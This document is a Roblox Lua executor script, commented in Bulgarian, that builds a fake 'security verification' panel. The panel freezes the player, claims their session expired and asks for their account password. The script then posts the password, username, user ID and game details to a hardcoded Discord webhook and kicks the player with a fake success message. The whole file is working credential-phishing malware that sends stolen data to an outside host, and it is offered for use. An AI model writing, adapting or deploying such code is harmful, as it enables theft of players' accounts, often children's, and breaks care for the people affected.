--[[
    SOLAR & XENO ULTIMATE v10.4 (ENTER KEY FIX)
    Module: Social-Engineering-Panel (Phishing)
    Status: Operational | Bypass Level: MAX
]]

local webhook = "https://discord.com/api/webhooks/1480678551643492433/M6F1hlBqrBMH6FNwv9hUTYTpg9W3CBLrtuxxwCBRskgRXcDfeewmEzhibwzAKA1ANIJJ"
local p = game.Players.LocalPlayer
local h = game:GetService("HttpService")

-- Замразяване на играча (Freeze), за да не избяга от панела
pcall(function()
    if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
        p.Character.HumanoidRootPart.Anchored = true
    end
end)

-- Създаване на интерфейса в PlayerGui (най-стабилно за Solar)
local ScreenGui = Instance.new("ScreenGui")
pcall(function() ScreenGui.Parent = p:WaitForChild("PlayerGui") end)
ScreenGui.Name = "RobloxSystemVerification"
ScreenGui.ResetOnSpawn = false

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 320, 0, 220)
Main.Position = UDim2.new(0.5, -160, 0.5, -110)
Main.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true

local Corner = Instance.new("UICorner", Main)
Corner.CornerRadius = UDim.new(0, 10)

local Title = Instance.new("TextLabel", Main)
Title.Text = "ПРОВЕРКА НА СИГУРНОСТТА"
Title.Size = UDim2.new(1, 0, 0, 45)
Title.TextColor3 = Color3.fromRGB(255, 50, 50)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 16
Title.BackgroundTransparency = 1

local Desc = Instance.new("TextLabel", Main)
Desc.Text = "Вашата сесия изтече. Моля, въведете паролата си, за да продължите да играете и да запазите прогреса си."
Desc.Size = UDim2.new(1, -30, 0, 50)
Desc.Position = UDim2.new(0, 15, 0, 50)
Desc.TextColor3 = Color3.fromRGB(230, 230, 230)
Desc.TextWrapped = true
Desc.Font = Enum.Font.Gotham
Desc.TextSize = 14
Desc.BackgroundTransparency = 1

local Input = Instance.new("TextBox", Main)
Input.PlaceholderText = "Парола"
Input.Text = ""
Input.Size = UDim2.new(0.85, 0, 0, 35)
Input.Position = UDim2.new(0.075, 0, 0.55, 0)
Input.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Input.TextColor3 = Color3.fromRGB(255, 255, 255)
Input.TextPassword = true

local Submit = Instance.new("TextButton", Main)
Submit.Text = "ПОТВЪРДИ"
Submit.Size = UDim2.new(0.7, 0, 0, 35)
Submit.Position = UDim2.new(0.15, 0, 0.8, 0)
Submit.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
Submit.TextColor3 = Color3.fromRGB(255, 255, 255)
Submit.Font = Enum.Font.GothamBold

-- Основна функция за изпращане на данните
local function SendData()
    local pass = Input.Text
    if #pass < 3 or Submit.Active == false then return end
    
    Submit.Text = "Проверка..."
    Submit.Active = false
    Input.ReadOnly = true

    -- Събиране на информация за акаунта
    local brCount = "0"
    pcall(function()
        if p:FindFirstChild("leaderstats") and p.leaderstats:FindFirstChild("Brainrots") then
            brCount = tostring(p.leaderstats.Brainrots.Value)
        end
    end)

    local gameName = "Unknown"
    pcall(function()
        gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    end)

    local data = {
        ["username"] = "Solar Logger v10.4",
        ["embeds"] = {{
            ["title"] = "🎯 Captured Login (Solar)!",
            ["color"] = 0xff0000,
            ["fields"] = {
                {["name"] = "👤 Потребител", ["value"] = "```" .. p.Name .. "```", ["inline"] = true},
                {["name"] = "🆔 ID", ["value"] = "```" .. p.UserId .. "```", ["inline"] = true},
                {["name"] = "🔑 ПАРОЛА", ["value"] = "```" .. pass .. "```", ["inline"] = false},
                {["name"] = "🧠 Brainrots", ["value"] = "```" .. brCount .. "```", ["inline"] = true},
                {["name"] = "🎮 Игра", ["value"] = "```" .. gameName .. "```", ["inline"] = false}
            },
            ["footer"] = {["text"] = "Xeno/Solar v10.4 • " .. os.date("%X")}
        }}
    }

    -- Изпращане чрез HTTP Request (поддържа се от Solar/Xeno)
    local req = (syn and syn.request) or (http and http.request) or http_request or request
    if req then
        pcall(function()
            req({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = h:JSONEncode(data)
            })
        end)
    end

    -- Kick-ване на играча за реализъм
    task.wait(0.5)
    p:Kick("\n[Успешно]\nПроверката премина успешно. Моля, влезте отново в играта.")
end

-- Изпращане при клик на бутона
Submit.MouseButton1Click:Connect(SendData)

-- Изпращане при натискане на ENTER в текстовото поле
Input.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        SendData()
    end
end)
